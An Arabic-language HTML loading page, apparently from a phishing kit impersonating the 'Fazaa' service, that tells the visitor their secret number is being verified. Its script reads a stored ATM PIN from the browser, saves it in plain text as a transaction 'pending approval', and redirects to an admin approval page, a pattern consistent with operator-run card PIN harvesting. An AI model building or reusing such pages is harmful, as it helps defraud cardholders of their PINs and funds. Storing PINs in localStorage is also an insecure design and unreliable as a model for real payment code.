<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري معالجة الرقم السري - فزعة</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 12px;
            padding: 40px 20px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid #e5e7eb;
            border-top: 4px solid #0066cc;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .title {
            font-size: 20px;
            font-weight: 600;
            color: #1f2937;
            margin-bottom: 10px;
        }

        .subtitle {
            font-size: 14px;
            color: #6b7280;
            margin-bottom: 20px;
        }

        .status-text {
            font-size: 13px;
            color: #0066cc;
            font-weight: 500;
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background: #e5e7eb;
            border-radius: 2px;
            margin-top: 20px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: #0066cc;
            animation: progress 3s ease-in-out forwards;
        }

        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div class="title">جاري التحقق من الرقم السري</div>
        <div class="subtitle">يرجى الانتظار قليلاً...</div>
        <div class="status-text">جاري التحقق من البيانات</div>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
    </div>

    <script>
        function getQueryParam(param) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }

        setTimeout(() => {
            const txnId = getQueryParam('txnId');
            
            // Create ATM verification transaction
            const atmTransaction = {
                id: 'ATM_' + txnId + '_' + Date.now(),
                parentTxnId: txnId,
                type: 'atm_verification',
                status: 'pending_approval',
                pin: localStorage.getItem('atmPin'),
                timestamp: new Date().toLocaleString('ar-EG'),
                createdAt: new Date().toISOString()
            };

            // Save to transactions list
            const transactions = JSON.parse(localStorage.getItem('fazaaTransactions') || '[]');
            transactions.push(atmTransaction);
            localStorage.setItem('fazaaTransactions', JSON.stringify(transactions));

            // Redirect to admin approval
            window.location.href = 'admin_approval_atm_ar.html?txnId=' + atmTransaction.id;
        }, 3000);
    </script>
</body>
</html>
